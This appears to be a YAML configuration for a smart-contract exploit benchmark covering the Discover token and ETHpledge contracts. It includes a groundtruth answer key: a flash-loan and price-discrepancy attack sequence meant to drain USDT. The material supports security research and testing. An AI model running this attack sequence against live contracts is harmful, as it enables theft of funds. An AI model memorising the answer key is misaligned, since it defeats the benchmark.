@@ -1,0 +1,66 @@
+# Information for benchmarks building.
+project_name: "Discover"
+
+ctrt_name2cls:
+  - ["usdt", "USDT"]
+  - ["disc", "Discover"]
+  - ["pair", "UniswapV2Pair"]
+  - ["factory", "UniswapV2Factory"]
+  - ["router", "UniswapV2Router"]
+  - ["ethpledge", "ETHpledge"]
+
+ctrt_name2deploy:
+  - ["usdt", ""]
+  - ["disc", "new Discover()"]
+  - ["pair", ""]
+  - ["factory", ""]
+  - ["router", ""]
+  - [
+      "ethpledge",
+      "new ETHpledge(
+      address(usdt),
+      address(disc),
+      address(0xdead), address(0xdead), address(pair))",
+    ]
+
+extra_actions:
+  - "function swap_ethpledge_usdt_disc(uint256 amount) internal {
+    usdt.approve(address(ethpledge), UINT256_MAX);
+    ethpledge.pledgein(amount);
+    }"
+
+extra_deployments: []
+extra_constraints: []
+
+attack_goal: "usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker"
+
+groundtruth:
+  - ["borrow", "disc", "24000e18"]
+  - ["swap", "pair", "disc", "usdt", "disc.balanceOf(attacker)"]
+  - ["swap", "ethpledge", "usdt", "disc", "5000e18"]
+  - ["payback", "disc", "24000e18 * 1003 / 1000"]
+
+# Information for search space building.
+roles:
+  "usdt":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "disc":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: false
+  "pair":
+    is_swappair: true
+    uniswap_order: ["usdt", "disc"]
+    support_swaps:
+      "usdt": ["disc", "usdt"]
+      "disc": ["disc", "usdt"]
+    is_oracle: true
+  "ethpledge":
+    is_swappair: true
+    support_swaps:
+      "usdt": ["disc", "usdt"]
+      "disc": ["disc"]
+
+pattern: "Price Discrepancy"
